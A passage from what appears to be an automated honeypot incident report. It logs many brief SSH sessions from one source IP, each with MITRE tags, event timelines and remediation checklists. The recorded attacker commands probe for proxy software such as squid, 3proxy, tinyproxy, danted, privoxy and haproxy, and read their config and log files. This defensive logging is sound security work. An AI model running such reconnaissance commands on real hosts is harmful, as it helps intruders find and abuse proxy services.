| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/squid 2>/dev/null; ls -la /usr/sbin/squid 2>/dev/null; pgrep -af squid 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:39` | `cowrie.session.connect` |
| `2026-07-13 12:31:39` | `cowrie.client.version` |
| `2026-07-13 12:31:39` | `cowrie.client.kex` |
| `2026-07-13 12:31:40` | `cowrie.login.success` |
| `2026-07-13 12:31:41` | `cowrie.client.var` |
| `2026-07-13 12:31:41` | `cowrie.client.var` |
| `2026-07-13 12:31:41` | `cowrie.session.params` |
| `2026-07-13 12:31:41` | `cowrie.command.input` |
| `2026-07-13 12:31:41` | `cowrie.log.closed` |
| `2026-07-13 12:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca970f4a137b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/squid/squid.conf 2>/dev/null; cat /etc/squid/squid.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:42` | `cowrie.session.connect` |
| `2026-07-13 12:31:42` | `cowrie.client.version` |
| `2026-07-13 12:31:42` | `cowrie.client.kex` |
| `2026-07-13 12:31:43` | `cowrie.login.success` |
| `2026-07-13 12:31:44` | `cowrie.client.var` |
| `2026-07-13 12:31:44` | `cowrie.client.var` |
| `2026-07-13 12:31:44` | `cowrie.session.params` |
| `2026-07-13 12:31:44` | `cowrie.command.input` |
| `2026-07-13 12:31:44` | `cowrie.log.closed` |
| `2026-07-13 12:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c9b35ffc40

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /var/log/squid/access.log 2>/dev/null; cat /var/log/squid/access.log 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:45` | `cowrie.session.connect` |
| `2026-07-13 12:31:45` | `cowrie.client.version` |
| `2026-07-13 12:31:45` | `cowrie.client.kex` |
| `2026-07-13 12:31:46` | `cowrie.login.success` |
| `2026-07-13 12:31:47` | `cowrie.client.var` |
| `2026-07-13 12:31:47` | `cowrie.client.var` |
| `2026-07-13 12:31:48` | `cowrie.session.params` |
| `2026-07-13 12:31:48` | `cowrie.command.input` |
| `2026-07-13 12:31:48` | `cowrie.log.closed` |
| `2026-07-13 12:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d015636c90

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/3proxy 2>/dev/null; ls -la /usr/bin/3proxy 2>/dev/null; pgrep -af 3proxy 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:48` | `cowrie.session.connect` |
| `2026-07-13 12:31:48` | `cowrie.client.version` |
| `2026-07-13 12:31:48` | `cowrie.client.kex` |
| `2026-07-13 12:31:50` | `cowrie.login.success` |
| `2026-07-13 12:31:50` | `cowrie.client.var` |
| `2026-07-13 12:31:50` | `cowrie.client.var` |
| `2026-07-13 12:31:51` | `cowrie.session.params` |
| `2026-07-13 12:31:51` | `cowrie.command.input` |
| `2026-07-13 12:31:51` | `cowrie.log.closed` |
| `2026-07-13 12:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a3d80e2e32

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/3proxy/3proxy.cfg 2>/dev/null; cat /etc/3proxy/3proxy.cfg 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:51` | `cowrie.session.connect` |
| `2026-07-13 12:31:51` | `cowrie.client.version` |
| `2026-07-13 12:31:51` | `cowrie.client.kex` |
| `2026-07-13 12:31:53` | `cowrie.login.success` |
| `2026-07-13 12:31:53` | `cowrie.client.var` |
| `2026-07-13 12:31:53` | `cowrie.client.var` |
| `2026-07-13 12:31:54` | `cowrie.session.params` |
| `2026-07-13 12:31:54` | `cowrie.command.input` |
| `2026-07-13 12:31:54` | `cowrie.log.closed` |
| `2026-07-13 12:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba1575ec307

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /var/log/3proxy/ 2>/dev/null; cat /var/log/3proxy/ 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:54` | `cowrie.session.connect` |
| `2026-07-13 12:31:54` | `cowrie.client.version` |
| `2026-07-13 12:31:55` | `cowrie.client.kex` |
| `2026-07-13 12:31:56` | `cowrie.login.success` |
| `2026-07-13 12:31:56` | `cowrie.client.var` |
| `2026-07-13 12:31:56` | `cowrie.client.var` |
| `2026-07-13 12:31:57` | `cowrie.session.params` |
| `2026-07-13 12:31:57` | `cowrie.command.input` |
| `2026-07-13 12:31:57` | `cowrie.log.closed` |
| `2026-07-13 12:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec8a854801c

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/tinyproxy 2>/dev/null; ls -la /usr/sbin/tinyproxy 2>/dev/null; pgrep -af tinyproxy 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:58` | `cowrie.session.connect` |
| `2026-07-13 12:31:58` | `cowrie.client.version` |
| `2026-07-13 12:31:58` | `cowrie.client.kex` |
| `2026-07-13 12:31:59` | `cowrie.login.success` |
| `2026-07-13 12:32:00` | `cowrie.client.var` |
| `2026-07-13 12:32:00` | `cowrie.client.var` |
| `2026-07-13 12:32:00` | `cowrie.session.params` |
| `2026-07-13 12:32:00` | `cowrie.command.input` |
| `2026-07-13 12:32:00` | `cowrie.log.closed` |
| `2026-07-13 12:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e8afb9bf74

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/tinyproxy/tinyproxy.conf 2>/dev/null; cat /etc/tinyproxy/tinyproxy.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:01` | `cowrie.session.connect` |
| `2026-07-13 12:32:01` | `cowrie.client.version` |
| `2026-07-13 12:32:01` | `cowrie.client.kex` |
| `2026-07-13 12:32:02` | `cowrie.login.success` |
| `2026-07-13 12:32:03` | `cowrie.client.var` |
| `2026-07-13 12:32:03` | `cowrie.client.var` |
| `2026-07-13 12:32:03` | `cowrie.session.params` |
| `2026-07-13 12:32:03` | `cowrie.command.input` |
| `2026-07-13 12:32:03` | `cowrie.log.closed` |
| `2026-07-13 12:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e594f785b3d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /var/log/tinyproxy/ 2>/dev/null; cat /var/log/tinyproxy/ 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:04` | `cowrie.session.connect` |
| `2026-07-13 12:32:04` | `cowrie.client.version` |
| `2026-07-13 12:32:04` | `cowrie.client.kex` |
| `2026-07-13 12:32:05` | `cowrie.login.success` |
| `2026-07-13 12:32:06` | `cowrie.client.var` |
| `2026-07-13 12:32:06` | `cowrie.client.var` |
| `2026-07-13 12:32:06` | `cowrie.session.params` |
| `2026-07-13 12:32:07` | `cowrie.command.input` |
| `2026-07-13 12:32:07` | `cowrie.log.closed` |
| `2026-07-13 12:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2d4e243fbd

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/sockd 2>/dev/null; ls -la /usr/sbin/sockd 2>/dev/null; pgrep -af sockd 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:07` | `cowrie.session.connect` |
| `2026-07-13 12:32:07` | `cowrie.client.version` |
| `2026-07-13 12:32:07` | `cowrie.client.kex` |
| `2026-07-13 12:32:09` | `cowrie.login.success` |
| `2026-07-13 12:32:09` | `cowrie.client.var` |
| `2026-07-13 12:32:09` | `cowrie.client.var` |
| `2026-07-13 12:32:09` | `cowrie.session.params` |
| `2026-07-13 12:32:09` | `cowrie.command.input` |
| `2026-07-13 12:32:09` | `cowrie.log.closed` |
| `2026-07-13 12:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1784f6bc03e6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/danted.conf 2>/dev/null; cat /etc/danted.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:10` | `cowrie.session.connect` |
| `2026-07-13 12:32:10` | `cowrie.client.version` |
| `2026-07-13 12:32:10` | `cowrie.client.kex` |
| `2026-07-13 12:32:12` | `cowrie.login.success` |
| `2026-07-13 12:32:12` | `cowrie.client.var` |
| `2026-07-13 12:32:12` | `cowrie.client.var` |
| `2026-07-13 12:32:13` | `cowrie.session.params` |
| `2026-07-13 12:32:13` | `cowrie.command.input` |
| `2026-07-13 12:32:13` | `cowrie.log.closed` |
| `2026-07-13 12:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee02fe33a11d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/sockd.conf 2>/dev/null; cat /etc/sockd.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:13` | `cowrie.session.connect` |
| `2026-07-13 12:32:13` | `cowrie.client.version` |
| `2026-07-13 12:32:14` | `cowrie.client.kex` |
| `2026-07-13 12:32:15` | `cowrie.login.success` |
| `2026-07-13 12:32:15` | `cowrie.client.var` |
| `2026-07-13 12:32:15` | `cowrie.client.var` |
| `2026-07-13 12:32:16` | `cowrie.session.params` |
| `2026-07-13 12:32:16` | `cowrie.command.input` |
| `2026-07-13 12:32:16` | `cowrie.log.closed` |
| `2026-07-13 12:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c280d8189493

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/privoxy 2>/dev/null; ls -la /usr/sbin/privoxy 2>/dev/null; pgrep -af privoxy 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:16` | `cowrie.session.connect` |
| `2026-07-13 12:32:16` | `cowrie.client.version` |
| `2026-07-13 12:32:17` | `cowrie.client.kex` |
| `2026-07-13 12:32:18` | `cowrie.login.success` |
| `2026-07-13 12:32:18` | `cowrie.client.var` |
| `2026-07-13 12:32:18` | `cowrie.client.var` |
| `2026-07-13 12:32:19` | `cowrie.session.params` |
| `2026-07-13 12:32:19` | `cowrie.command.input` |
| `2026-07-13 12:32:19` | `cowrie.log.closed` |
| `2026-07-13 12:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2645b1f1b125

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/privoxy/config 2>/dev/null; cat /etc/privoxy/config 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:20` | `cowrie.session.connect` |
| `2026-07-13 12:32:20` | `cowrie.client.version` |
| `2026-07-13 12:32:20` | `cowrie.client.kex` |
| `2026-07-13 12:32:21` | `cowrie.login.success` |
| `2026-07-13 12:32:22` | `cowrie.client.var` |
| `2026-07-13 12:32:22` | `cowrie.client.var` |
| `2026-07-13 12:32:22` | `cowrie.session.params` |
| `2026-07-13 12:32:22` | `cowrie.command.input` |
| `2026-07-13 12:32:22` | `cowrie.log.closed` |
| `2026-07-13 12:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098c81b0767d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /var/log/privoxy/ 2>/dev/null; cat /var/log/privoxy/ 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:23` | `cowrie.session.connect` |
| `2026-07-13 12:32:23` | `cowrie.client.version` |
| `2026-07-13 12:32:23` | `cowrie.client.kex` |
| `2026-07-13 12:32:24` | `cowrie.login.success` |
| `2026-07-13 12:32:25` | `cowrie.client.var` |
| `2026-07-13 12:32:25` | `cowrie.client.var` |
| `2026-07-13 12:32:25` | `cowrie.session.params` |
| `2026-07-13 12:32:25` | `cowrie.command.input` |
| `2026-07-13 12:32:25` | `cowrie.log.closed` |
| `2026-07-13 12:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd6e27887e6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/polipo 2>/dev/null; ls -la /usr/bin/polipo 2>/dev/null; pgrep -af polipo 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:26` | `cowrie.session.connect` |
| `2026-07-13 12:32:26` | `cowrie.client.version` |
| `2026-07-13 12:32:26` | `cowrie.client.kex` |
| `2026-07-13 12:32:28` | `cowrie.login.success` |
| `2026-07-13 12:32:28` | `cowrie.client.var` |
| `2026-07-13 12:32:28` | `cowrie.client.var` |
| `2026-07-13 12:32:29` | `cowrie.session.params` |
| `2026-07-13 12:32:29` | `cowrie.command.input` |
| `2026-07-13 12:32:29` | `cowrie.log.closed` |
| `2026-07-13 12:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7be232ffa32b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/polipo/config 2>/dev/null; cat /etc/polipo/config 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:29` | `cowrie.session.connect` |
| `2026-07-13 12:32:29` | `cowrie.client.version` |
| `2026-07-13 12:32:30` | `cowrie.client.kex` |
| `2026-07-13 12:32:31` | `cowrie.login.success` |
| `2026-07-13 12:32:31` | `cowrie.client.var` |
| `2026-07-13 12:32:31` | `cowrie.client.var` |
| `2026-07-13 12:32:32` | `cowrie.session.params` |
| `2026-07-13 12:32:32` | `cowrie.command.input` |
| `2026-07-13 12:32:32` | `cowrie.log.closed` |
| `2026-07-13 12:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412cc369964e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/haproxy 2>/dev/null; ls -la /usr/sbin/haproxy 2>/dev/null; pgrep -af haproxy 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:33` | `cowrie.session.connect` |
| `2026-07-13 12:32:33` | `cowrie.client.version` |
| `2026-07-13 12:32:33` | `cowrie.client.kex` |
| `2026-07-13 12:32:34` | `cowrie.login.success` |
| `2026-07-13 12:32:35` | `cowrie.client.var` |
| `2026-07-13 12:32:35` | `cowrie.client.var` |
| `2026-07-13 12:32:35` | `cowrie.session.params` |
| `2026-07-13 12:32:35` | `cowrie.command.input` |
| `2026-07-13 12:32:35` | `cowrie.log.closed` |
| `2026-07-13 12:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ff9965498d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/haproxy/haproxy.cfg 2>/dev/null; cat /etc/haproxy/haproxy.cfg 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:36` | `cowrie.session.connect` |
| `2026-07-13 12:32:36` | `cowrie.client.version` |
| `2026-07-13 12:32:36` | `cowrie.client.kex` |
| `2026-07-13 12:32:37` | `cowrie.login.success` |
| `2026-07-13 12:32:38` | `cowrie.client.var` |
| `2026-07-13 12:32:38` | `cowrie.client.var` |
| `2026-07-13 12:32:38` | `cowrie.session.params` |
| `2026-07-13 12:32:38` | `cowrie.command.input` |
| `2026-07-13 12:32:38` | `cowrie.log.closed` |
| `2026-07-13 12:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0a169f5b22

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/nginx 2>/dev/null; ls -la /usr/sbin/nginx 2>/dev/null; pgrep -af nginx 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:39` | `cowrie.session.connect` |
| `2026-07-13 12:32:39` | `cowrie.client.version` |
| `2026-07-13 12:32:39` | `cowrie.client.kex` |
| `2026-07-13 12:32:41` | `cowrie.login.success` |
| `2026-07-13 12:32:41` | `cowrie.client.var` |
| `2026-07-13 12:32:41` | `cowrie.client.var` |
| `2026-07-13 12:32:42` | `cowrie.session.params` |
| `2026-07-13 12:32:42` | `cowrie.command.input` |
| `2026-07-13 12:32:42` | `cowrie.log.closed` |
| `2026-07-13 12:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b3cdd9fcaa1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/nginx/nginx.conf 2>/dev/null; cat /etc/nginx/nginx.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:42` | `cowrie.session.connect` |
| `2026-07-13 12:32:42` | `cowrie.client.version` |
| `2026-07-13 12:32:43` | `cowrie.client.kex` |
| `2026-07-13 12:32:44` | `cowrie.login.success` |
| `2026-07-13 12:32:44` | `cowrie.client.var` |
| `2026-07-13 12:32:44` | `cowrie.client.var` |
| `2026-07-13 12:32:45` | `cowrie.session.params` |
| `2026-07-13 12:32:45` | `cowrie.command.input` |
| `2026-07-13 12:32:45` | `cowrie.log.closed` |
| `2026-07-13 12:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72bf42a78aab

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/redsocks 2>/dev/null; ls -la /usr/sbin/redsocks 2>/dev/null; pgrep -af redsocks 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:45` | `cowrie.session.connect` |
| `2026-07-13 12:32:45` | `cowrie.client.version` |
| `2026-07-13 12:32:46` | `cowrie.client.kex` |
| `2026-07-13 12:32:47` | `cowrie.login.success` |
| `2026-07-13 12:32:47` | `cowrie.client.var` |
| `2026-07-13 12:32:47` | `cowrie.client.var` |
| `2026-07-13 12:32:48` | `cowrie.session.params` |
| `2026-07-13 12:32:48` | `cowrie.command.input` |
| `2026-07-13 12:32:48` | `cowrie.log.closed` |
| `2026-07-13 12:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
